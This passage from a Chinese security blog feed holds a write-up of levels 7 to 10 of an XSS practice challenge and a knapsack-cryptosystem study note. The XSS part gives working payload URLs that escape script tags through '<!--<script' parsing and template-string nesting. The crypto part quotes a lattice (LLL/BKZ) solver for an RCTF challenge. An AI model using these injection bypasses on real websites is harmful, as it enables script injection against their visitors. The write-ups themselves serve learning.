alt="image-20200715110011446"></p><p>这里要用到一个<code>&lt;script&gt;</code>标签的特性</p><p>参考<a href="https://www.dazhuanlan.com/2019%2F10%2F25%2F5db1e6beea817/" target="_blank" rel="noopener">https://www.dazhuanlan.com/2019%2F10%2F25%2F5db1e6beea817/</a></p><p>HTML5解析器在标签<code>&lt;script&gt;&lt;/script&gt;</code>中解析到<code>&lt;!--</code>时候，会进入到dash dash escaped state，哪怕是<code>&lt;script&gt;</code>出现在js的字符串中。</p><p>大概意思就是在script标签里如果遇到<code>&lt;!--</code>，那么这个的解析优先级会变成最高，如果这个后面再出现<code>&lt;script&gt;</code>标签，那么最近的另一个<code>&lt;/script&gt;</code>标签就会优先去闭合这个。</p><p>于是我们输入<code>?px=&lt;!--&lt;script%20&gt;</code>，因为&gt;会被转义，所以我们前面打一个空格，<code>&lt;!--&lt;script%20&gt;</code>被转义为<code>\&lt;!--\&lt;script%20\&gt;</code>，根据js的特性，这等于<code>\&lt;!--\&lt;script%20\=&#39;&#39;&gt;</code>,<code>\</code>被认为是一个属性了，值是空，所以这个<code>&lt;script&gt;</code>标签被解析。</p><p>于是该字符串下方的<code>&lt;/script&gt;</code>则被用来闭合我们的输入</p><p><img src="https://i.loli.net/2020/07/16/hnTVeNfubr8o94q.png" alt="image-20200715111558811"></p><p>这样两次同步输出都在js中了，于是这里使用模板字符串，用运算符拼接字符串</p><p>payload:</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://px<span class="number">1624</span>.sinaapp.com/test/xsstest<span class="number">7</span>/?px=\<span class="symbol">%27</span>-`-alert(<span class="number">1</span>)//<span class="symbol">%3</span>C<span class="title">!--</span><span class="symbol">%3</span>Cscript<span class="symbol">%20</span><span class="symbol">%3</span>E<span class="comment">;</span></span><br></pre></td></tr></table></figure><p>返回</p><p><img src="https://i.loli.net/2020/07/16/REqsXPfg9U1n4ed.png" alt="image-20200715113149100"></p><h4 id="第八关"><a href="#第八关" class="headerlink" title="第八关"></a>第八关</h4><p><a href="http://px1624.sinaapp.com/test/xsstest8/" target="_blank" rel="noopener">http://px1624.sinaapp.com/test/xsstest8/</a></p><p>第八关较第七关，输入点多了一个px1624</p><p>同样也是同步输出，除去两个在<code>&lt;script&gt;</code>标签里的输出点，一个在<code>&lt;div&gt;</code>标签间，一个是<code>&lt;input&gt;</code>标签的value值，但是px1624的值就是px的值</p><p><img src="https://i.loli.net/2020/07/16/rtOI1X2A9Bk5jPw.png" alt="image-20200715113615191"></p><p>输出点出现在value处，首先想到的是闭合双引号，然后用on事件触发弹窗，然而这里对双引号做了过滤，所以这里还是要跳出<code>&lt;script&gt;</code>标签，</p><p>首先用    <code>http://px1624.sinaapp.com/test/xsstest8/?px=%3C!--%3Cscript%20%3E</code>跳出</p><p><img src="https://i.loli.net/2020/07/16/RWcE7VvIfqmwk6T.png" alt="image-20200715133932290"></p><p>个人理解：这里第一个<code>&lt;!--</code>遇到了<code>&lt;script&gt;</code>，随后优先级变高，紧跟着下面的那个<code>&lt;!--</code>就直接被无视了，然后遇到了下面的<code>&lt;/script&gt;</code>，直接拿了过来，优先级回落，然后最后一行又出现了<code>&lt;!--&lt;script &gt;</code>，但是后面已经没内容了，随后浏览器进行DOM渲染， 补上了<code>&lt;/script&gt;</code>。</p><p>最终payload:<code>http://px1624.sinaapp.com/test/xsstest8/?px=%3C!--%3C/script%3E%3Cscript%20%3Ealert(1)%3C/script%3E</code></p><p>以<code>&lt;/script&gt;</code>开头，在<code>&lt;!--</code>遇到<code>&lt;script&gt;</code>后被提升的优先级回落后【优先级回落前，遇到的第二个<code>&lt;!--&lt;script&gt;</code>并不能起到作用】，立刻闭合最前面的<code>&lt;script&gt;</code>标签，随后自己再补上一个<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>进行弹窗，这里是第四个输出点，并没有被编码or转义，故弹窗成功。</p><p>返回</p><p><img src="https://i.loli.net/2020/07/16/EYCP9AyfUVgzMSi.png" alt="image-20200715142513727"></p><h4 id="第九关"><a href="#第九关" class="headerlink" title="第九关"></a>第九关</h4><p><a href="http://px1624.sinaapp.com/test/xsstest9/" target="_blank" rel="noopener">http://px1624.sinaapp.com/test/xsstest9/</a></p><p>同样四个输出点，但是下面都做了一个html实体编码，因此用第八题的payload我们没法主动去闭合第一个<code>&lt;script&gt;</code>标签，更没法弹窗了</p><p><img src="https://i.loli.net/2020/07/16/VzUPbATemHGjlDq.png" alt="image-20200716140504739"></p><p>所以这里的思路，只要在<code>&lt;script&gt;</code>标签中写入<code>alert(1)</code>就能弹窗了，这里应该要用到字符串与运算符间的拼接，然后要利用到模板字符串。当然，用<code>&lt;--！</code>跳出<code>&lt;script&gt;</code>也是必不可少的一个步骤。（注意到，其实第三个和第四个输出点是由长度限制的，我们可以用这个长度限制来解决一些问题。</p><p>最终的payload：</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//px</span>1624.sinaapp.com/test/xsstest9/?px=a\%27-&#123;a:<span class="string">`&#125;-alert(1)//`</span>&#125;-&#123;a:<span class="string">`$&#123;`</span>%3C!--%3Cscript%20%3E</span><br></pre></td></tr></table></figure><p>返回：</p><p><img src="https://i.loli.net/2020/07/16/uJTKMs1SYFhHUpz.png" alt="image-20200716145039824"></p><p>从下面两个输出点看起的话可以发现，这里没有对<code>/</code>进行转义，所以可以注释后面的一个标签。然后由于多余的`都被截断了，这里刚好剩下两个，可以用来闭合上面多出来的。而上面连续的两个`则用嵌套的方式隔开。由于同步输出，所以第一行后半部分也会有两个`,也正好对应前面两个`。</p><p>对于构造步骤：</p><p>首先是想在前面独立出一个alert(1)，</p><p><img src="https://i.loli.net/2020/07/16/BGZC1dE7pAlwoc9.png" alt="image-20200716152142498"></p><p>类似这样，但这需要后面都被模板字符串包裹，测试过很多种，都没有成功实现。</p><p>于是想着在最后独立出一个alert(1)，后面的标签可以注释掉。又因为同步输出的问题，一行里的`的个数得是一个奇数才能达到一个逃逸的效果；但如果是偶数的话，利用嵌套，也可以达到跨行闭合的效果。而嵌套我们用对象，是{a:`${`的形式，所以得有一个`}来闭合{`，然后还得有一个}来闭合{，所以前半段得出现`}和}，既然有了}，那也得个{来闭合。于是就有了{a:`}xxxx}的形式，再补上一个`，变成{a:`}xxxx`}，这样这一段就是独立的了，并且补上的这个`也闭合了之前嵌套的`，再插入一个alert(1)，就有了下面的payload。</p><p><img src="https://i.loli.net/2020/07/16/tzD1glFVO5BHcd7.png" alt="image-20200716154041206"></p><p>这样子上半部分就配合的很好了，至于下面，`出现了四次，我们可以在前面填充下，就能抹去多余的两个`，从而实现弹窗</p><p><img src="https://i.loli.net/2020/07/16/vGb3TEDukaRKS5F.png" alt="image-20200716154225875"></p><p>这一关可能思路不是很顺，因为payload也不是自己测出来的，是对出题人给的payload的理解。</p><h4 id="第十关"><a href="#第十关" class="headerlink" title="第十关"></a>第十关</h4><p><a href="http://px1624.sinaapp.com/test/xsstest10/" target="_blank" rel="noopener">http://px1624.sinaapp.com/test/xsstest10/</a></p><p>相较于第九关，这一关的第三个输出点长度只输出两位，第四个输出点不限制长度</p><p>由于只有两个字符，所以`}大概是比较有用的，我们把这个放在第九关payload的最前面</p><p>返回</p><p><img src="https://i.loli.net/2020/07/16/TOzAIsjX4Qfpxa9.png" alt="image-20200716161451024"></p><p>提前闭合了，于是，想着再嵌套一层？刚好也多了两层`}，这样最后一行的alert(1)就可以出来了</p><p>payload</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//px</span>1624.sinaapp.com/test/xsstest1<span class="number">0</span>/?px=<span class="string">`&#125;\%27-&#123;a:`</span>&#125;-alert(<span class="number">1</span>)//<span class="string">`&#125;-&#123;a:`</span>$&#123;<span class="string">`$&#123;`</span>%3C!--%3Cscript%20%3E//</span><br></pre></td></tr></table></figure><p>返回</p><p><img src="https://i.loli.net/2020/07/16/E4MoUlckhSyFW21.png" alt="image-20200716161840912"></p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>这里是对这几个关卡的知识点的简单总结叭</p><p>第一关是一个简单的DOM型XSS，这里只需要进行一个简单的闭合操作就可，然后用到的取参函数是location.hash，所以对JavaScript需要有一定的熟悉。</p><p>第二关是考点是一个dom操作</p><p>第三关除了闭合外，还有JavaScript的字符串与运算符相关的知识：由于JavaScript是个弱类型，所以字符串之间也可以进行运算操作，也可以拿来做一种变相的拼接</p><p>第四关出现了字符型的运算符以及模板字符串相关的知识点，不过模板字符串一般需要至少两个可控输出点</p><p>第五关有一个重定向的小坑，不过问题不大。这里主要也是因为对参数过滤的不严格导致的xss，然后考点也是对输入点间的相互配合以达到利用效果叭</p><p>第六关主要利用的是Js的正则表达式、换行符相关的基础知识，以及对服务端其他文件的一些利用（比如用了第五关的user.php)</p><p>第七关是对<code>&lt;!-- &lt;script&gt;</code>以及模板字符串性质的利用，这些运用也都有在后面的关卡出现</p><p>第八关有四个同步输出点了，这一关的利用难度也提升了一个档次，同时也让我们对<code>&lt;!-- &lt;script&gt;</code>有了更深层次的理解。</p><p>第九关在第八关的基础上对后面两个输出点进行了编码，所以我们无法像第八关一样闭合前面的<code>&lt;script&gt;</code>，再自己写一个<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>来弹窗，只能在他给好的<code>&lt;script&gt;</code>标签间进行弹窗。这里用到了JavaScript的嵌套相关的性质</p><p>第十关在第九关的基础上对后面两个输出点的长度做了限制，这里过关的paylaod与第九关相比就是用到了更多一层的嵌套。</p><p>&emsp;&emsp;其实这里十关做下来，并没有用到XSS特殊的bypass姿势，主要还是对JavaScript的一些基础性质做了详细的了解学习，毕竟这里也都是一些反射型、DOM型XSS，可能在实际的漏洞挖掘中并没有很大的用处，利用起来也相对困难（很多厂商也不收），但对于我这个初学者来说还是受益良多。</p><h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><p>&emsp;&emsp;总的来看，在应用上，存储型XSS &gt; DOM型XSS ≈反射型XSS。为什么这么说？因为存储型XSS最持久，而且更为隐蔽，因为是存在数据库当中的，触发的url当中没有带js或者其他的html代码。然后反射型XSS和DOM型XSS，因为它们都需要在url中加入js代码才能够触发，所以需要与人交互<del>钓鱼</del>才能产生效果，否则也只能是自己日自己。</p>]]></content>
      
      
      <categories>
          
          <category> Web小屋 </category>
          
          <category> XSS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>密码学学习笔记 之 knapsack</title>
      <link href="/2020/06/08/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8Bknapsack%20/"/>
      <url>/2020/06/08/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8Bknapsack%20/</url>
      
        <content type="html"><![CDATA[<p>首发于<a href="https://www.anquanke.com/post/id/207798" target="_blank" rel="noopener">安全客</a></p><p>ACM中的背包问题是一种组合优化的NP完全问题，而在密码学中，也有对背包问题的应用。</p><h2 id="Subset-sum-problems-and-knapsack-cryptosystems"><a href="#Subset-sum-problems-and-knapsack-cryptosystems" class="headerlink" title="Subset-sum problems and knapsack cryptosystems"></a>Subset-sum problems and knapsack cryptosystems</h2><p>密码学中的利用knapsack problem的加密。大意就是，你公开一个序列，然后你把你的消息转为二进制，如果你消息的这一位是1，就从你序列中取出对应位置的值，最后密文就是你所有取出的值的和。</p><p>但是这样就产生一个问题，加密是加过去了。那该怎么解密呢？</p><p>蛮力攻击的时间复杂度是$O（2^n）$,就算中途相遇也只能降低到$O(2^{\frac{n}{2}})$。太难了。。。</p><p>那Alice怎么解决这个问题呢？公钥密码系统如何体现呢？</p><p>这就看Alice对序列的选择了。她用的是超递增序列。什么是超递增序列呢？就是后一项≥前一项的两倍，也就意味着，后一项大于前面的所有项之和。</p><p>有超递增序列后，给你一个密文，你只需要一项一项对比过来，你就能知道加密者选取的元素是哪几个了。</p><p>这不难理解。我们将序列中的每一项放到二进制下就很明显。如果第一项的位长是2，那第二项的位长就至少是3，如果第二项位长是3，那么第三项的位长至少是4。如果你的密文最后是个2位长的，那加密者必定是没有用到第三项，必定是用到了第二项，至于有没有用到第一项，那就看密文减掉第二项之后还有没有剩下来了。【当然，这在每一项只能用一次的大前提下】</p><h3 id="preparation"><a href="#preparation" class="headerlink" title="preparation"></a>preparation</h3><p>Alice准备加密了，首先她先整了一个超递增序列，$r = (r_1,r_2,,,r_n)$，然后她整了两个大数A和B，其中要求$B&gt;2r_n$ 也就是B大于这个超递增序列之和啦。然后要需要$gcd(A,B)=1$，因为之后要求一个A在B下的逆。</p><h3 id="encryption"><a href="#encryption" class="headerlink" title="encryption"></a>encryption</h3><p>Alice要加密了，她先用她的A和她的超递增序列生成一个新的序列M，其中$M_i \equiv Ar_i \pmod B$</p><p>这个新的序列就是Alice的公钥了，她把这个序列甩给Bob，然后Bob按照之前描述的方式，用这个序列和他的明文生成密文$S = x*M = \sum \limits_{i=1}^{n}x_iM_i$，然后把这传给Alice</p><h3 id="decryption"><a href="#decryption" class="headerlink" title="decryption"></a>decryption</h3><p>Alice要解密了，她拿到了这个密文S，然后计算</p><p>$S’ \equiv A^{-1}S \equiv A^{-1}\sum_{i=1}^{n}x_iM_i\equiv A^{-1}\sum_{i=1}^{n}x_iAr_i\equiv \sum_{i=1}^{n}x_ir_i \pmod B$</p><p>所以这个$S’$就是密文在超递增序列下的值了，之后再像之前那样判断一下这个$S’$和序列里面每一项的关系就能解出明文了。【记得从序列大的一端开始判断，如果满足关系别忘了减掉那一项再判断下一项】</p><p>伪代码走一波</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> reverse(r):</span><br><span class="line"><span class="keyword">if</span> s &gt;= i:</span><br><span class="line">        m = <span class="string">'1'</span> + m</span><br><span class="line">        s -= i</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        m = <span class="string">'0'</span> + m</span><br></pre></td></tr></table></figure><h3 id="table"><a href="#table" class="headerlink" title="table"></a>table</h3><p>来个总体流程</p><p><img src="https://i.loli.net/2020/05/26/7HwAdyNEGqDKLat.png" alt></p><h3 id="attention"><a href="#attention" class="headerlink" title="attention"></a>attention</h3><p>同RSA一样，这里对参数的选择也要慎重，不然会出现许多出人意料的问题。</p><p>具体实例可参考<a href="https://www.anquanke.com/post/id/206493#h3-11" target="_blank" rel="noopener">BJD3rd-knapsack</a></p><p>这里由于对参数A的不当选择，导致序列中较小的项乘以A后并没有被B模掉，也就导致了参数A的泄露。</p><p>并且由于这里的超递增序列的生成规则过于简单，只是不断地整除2，所以攻击者能够利用加密后的序列轻易的计算出B来。</p><h3 id="further-more"><a href="#further-more" class="headerlink" title="further more"></a>further more</h3><p>之前提到Alice最开始整的一个无序的序列，由于这玩意儿没有陷门(trapdoor)，因此这无法成为一个密码系统。但自从有关LLL的paper发表后，基于背包的密码系统出现了一个大weakness，</p><p>这里简短的介绍下Eve怎么去解决这个无序序列的背包问题。不管是序列本身无序，还是超递增序列加密后显得无序的序列。</p><p>Eve先构造了一个矩阵$M =<br>\begin{bmatrix}<br>2&amp;0&amp;0&amp;\dots&amp;0&amp;0&amp;m_1 \newline<br>0&amp;2&amp;0&amp;\dots&amp;0&amp;0&amp;m_2 \newline<br>\vdots&amp;\vdots&amp;\vdots&amp;\ddots&amp;\vdots&amp;\vdots&amp;\vdots \newline<br>0&amp;0&amp;0&amp;\dots&amp;2&amp;0&amp;m_{n-1}\newline<br>0&amp;0&amp;0&amp;\dots&amp;0&amp;2&amp;m_{n}\newline<br>1&amp;1&amp;1&amp;\dots&amp;1&amp;1&amp;S\newline<br>\end{bmatrix}$</p><p>其中这个$m_1,m_2,m_3…$就是那个无序序列，S就是密文</p><p>然后Eve从这个矩阵中，将每一条行向量划分出来，分别为$V_1,V_2,…,V_n,V_{n+1}$</p><p>我们现在假设向量$x = (x_1,x_2,x_3,…,x_n)$ 是明文，($x_i = 0$ or $1$)</p><p>那么这个格中就会有这么一条向量    </p><p>$t = \sum_ \limits {i=1}^{n}x_iV_i-V_{n+1}=(2x_1-1,2x_2-1,…,2x_n-1,0)$</p><p>这个t，因为$2x_i-1=\pm 1$，所以t的模长是$\sqrt{n}$，</p><p>根据Minkowskl’s First Theorem, </p><p>即对于任意n维满秩格基，都有   $SVP(L)≤\sqrt n(det(L))^{\frac 1 n}$</p><p>显然t是格L中的短向量。</p><p>所以，如果Eve知道如何找到lattice中的短向量，那么他就可以完成破解了。</p><p>关于找到lattice中短向量的算法我们称之为reduction algorithm，最著名的就是LLL algorithm了，然后它还有变体LLL-BKZ。</p><h3 id="variant"><a href="#variant" class="headerlink" title="variant"></a>variant</h3><p>再刚过去不久的2020RCTF中出现了一道有关knapsack problem 的变体，这里用的不是子集之和，而是子集之积</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Cryptodome.Util.number <span class="keyword">import</span> bytes_to_long, getPrime</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">sr = random.SystemRandom()</span><br><span class="line">p = getPrime(<span class="number">120</span>)</span><br><span class="line">num = [sr.randint(<span class="number">1</span>,p<span class="number">-1</span>) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">90</span>)]</span><br><span class="line">secret = sr.randint(<span class="number">0</span>, <span class="number">2</span>**<span class="number">90</span>)</span><br><span class="line">r = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">90</span>):</span><br><span class="line">    <span class="keyword">if</span> (secret &gt;&gt; i) &amp; <span class="number">1</span>:</span><br><span class="line">        r *= num[i]</span><br><span class="line">        r %= p</span><br><span class="line"></span><br><span class="line">flag = open(<span class="string">"flag.txt"</span>,<span class="string">"rb"</span>).read()</span><br><span class="line">h = hashlib.sha256(str(secret).encode(<span class="string">'utf-8'</span>)).digest()</span><br><span class="line"></span><br><span class="line">print(p)</span><br><span class="line">print(num)</span><br><span class="line">print(r)</span><br><span class="line">print(bytes_to_long(h)^bytes_to_long(flag))</span><br></pre></td></tr></table></figure><p>蛮力攻击的时间复杂度是2的90次方，即使是中途相遇攻击的时间复杂度也仍然有2的45次方，于此同时还得考虑2的45次方的空间复杂度。</p><p>赛后看了国外大佬hellman的<a href="https://gist.github.com/hellman/73eaee8c5b905b68badba147bfba6287" target="_blank" rel="noopener">脚本</a>才明白了本题的解法。</p><p>这一道题的切入点就在于模数p，通过不断地nc，直到获得的模数p具有p-1 smooth的性质（为了方便后面解离散对数），</p><p>这个时候再找到一个p的原根，然后对所有的数据利用pohlig算法解一个离散对数，就是开一个log，这样这个子集积的问题就能重新变回子集和的问题了。</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">from sage.all import *</span><br><span class="line">import ast, sys, subprocess</span><br><span class="line">import hashlib</span><br><span class="line">from <span class="built_in">random</span> import shuffle</span><br><span class="line">from <span class="built_in">time</span> import <span class="built_in">time</span></span><br><span class="line"></span><br><span class="line">#不断nc以获取一个具有p-<span class="number">1</span> smooth性质的模数p</span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">    data = subprocess.check_output(<span class="string">"nc 124.156.133.6 22298 &lt;/dev/null"</span>, shell=True).splitlines()</span><br><span class="line">    p = int(data[<span class="number">0</span>])</span><br><span class="line">    nums = ast.literal_eval(data[<span class="number">1</span>].decode())</span><br><span class="line">    r = int(data[<span class="number">2</span>])</span><br><span class="line">    encflag = int(data[<span class="number">3</span>])</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    fp1 = <span class="built_in">factor</span>(p-<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"p-1 ="</span>, fp1)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> all(d &lt; <span class="number">2</span>**<span class="number">50</span> <span class="keyword">for</span> d, e <span class="keyword">in</span> fp1):#判断模数是否具有p-<span class="number">1</span> smooth的性质</span><br><span class="line">        <span class="built_in">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"too high factor of p-1"</span>)</span><br><span class="line"></span><br><span class="line"># 解离散对数问题 -&gt; 将子集积问题转化问子集和</span><br><span class="line">F = GF(p)</span><br><span class="line">g = F.primitive_element() #获取原根g</span><br><span class="line">es = []</span><br><span class="line"><span class="keyword">for</span> <span class="built_in">num</span> <span class="keyword">in</span> nums:</span><br><span class="line">    e = F(<span class="built_in">num</span>).<span class="built_in">log</span>(g)#以原根为底数开<span class="built_in">log</span>，因为循环群中所有的数都能以原根表示</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">num</span>, <span class="string">"-&gt;"</span>, e)</span><br><span class="line">    es.<span class="built_in">append</span>(e)</span><br><span class="line"></span><br><span class="line">r = F(r).<span class="built_in">log</span>(g)</span><br><span class="line">nums = es</span><br><span class="line"><span class="built_in">mod</span> = p - <span class="number">1</span></span><br><span class="line"></span><br><span class="line">#利用LLL解决<span class="number">0</span>-<span class="number">1</span>背包问题</span><br><span class="line">N = <span class="number">90</span></span><br><span class="line"></span><br><span class="line">nums0 = nums[::]</span><br><span class="line"></span><br><span class="line">BS = <span class="number">30</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">itr</span> = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">    <span class="built_in">itr</span> += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">itr</span>, <span class="string">"BS"</span>, BS)</span><br><span class="line">    t0 = <span class="built_in">time</span>()</span><br><span class="line"></span><br><span class="line">    nums = nums0[::]</span><br><span class="line">    shuffle(nums)</span><br><span class="line"></span><br><span class="line">    h = QQ(<span class="number">1</span>)/<span class="number">2</span></span><br><span class="line">    #  n1 <span class="number">1</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span></span><br><span class="line">    #  n2 <span class="number">0</span> <span class="number">1</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span></span><br><span class="line">    #  n3 <span class="number">0</span> <span class="number">0</span> <span class="number">1</span> <span class="number">0</span> <span class="number">0</span></span><br><span class="line">    #  n4 <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">1</span> <span class="number">0</span> </span><br><span class="line">    #   r h h h h h</span><br><span class="line">    # <span class="built_in">mod</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span></span><br><span class="line">    m = <span class="built_in">matrix</span>(QQ, N+<span class="number">2</span>, N+<span class="number">2</span>)</span><br><span class="line">    m.set_column(<span class="number">0</span>, nums + [r, <span class="built_in">mod</span>])</span><br><span class="line">    m.set_row(N, [r] + [h] * (N+<span class="number">1</span>))</span><br><span class="line">    m[:N,<span class="number">1</span>:N+<span class="number">1</span>] = identity_matrix(N)</span><br><span class="line"></span><br><span class="line">    m.set_column(<span class="number">0</span>, <span class="number">50</span>*m.column(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">    ml = (m*<span class="number">2</span>).change_ring(ZZ).BKZ(block_size=BS)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"time %.3fs"</span> <span class="symbol">%</span> (<span class="built_in">time</span>() - t0))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> irow, <span class="built_in">row</span> <span class="keyword">in</span> enumerate(ml):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> (-<span class="number">1</span> &lt;= <span class="built_in">min</span>(<span class="built_in">row</span>[:-<span class="number">1</span>]) &lt; <span class="built_in">max</span>(<span class="built_in">row</span>[:-<span class="number">1</span>]) &lt;= <span class="number">1</span>):</span><br><span class="line">            continue</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">row</span>[-<span class="number">1</span>] &lt; <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">row</span> = -<span class="built_in">row</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"GOOD"</span>, irow)</span><br><span class="line">        secret = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N):</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">row</span>[<span class="number">1</span>+i] &lt; <span class="number">0</span>:</span><br><span class="line">                secret |= <span class="number">1</span> &lt;&lt; nums0.index(nums[i])</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"secret"</span>, secret, <span class="string">"="</span>, hex(secret))</span><br><span class="line">        </span><br><span class="line">        h = hashlib.sha256(str(secret).encode('utf-<span class="number">8</span>')).digest()</span><br><span class="line">        h = int.from_bytes(h, <span class="string">"big"</span>)</span><br><span class="line">        flag = encflag ^ h</span><br><span class="line">        <span class="built_in">print</span>(int(flag).to_bytes(<span class="number">100</span>, <span class="string">"big"</span>).strip(b<span class="string">"\x00"</span>))</span><br><span class="line">        <span class="built_in">quit</span>()</span><br><span class="line"></span><br><span class="line"># RCTF&#123;M4th_0f_MuLLLtiplication_2333&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 密码小屋 </category>
          
          <category> Knapsack </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Knapsack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>密码学学习笔记 之 introduction to mathematical cryptography</title>
      <link href="/2020/05/27/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8Bintroduction%20to%20mathematical%20cryptography/"/>
      <url>/2020/05/27/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8Bintroduction%20to%20mathematical%20cryptography/</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="施工中..." />    <label for="hbePass">施工中...</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" 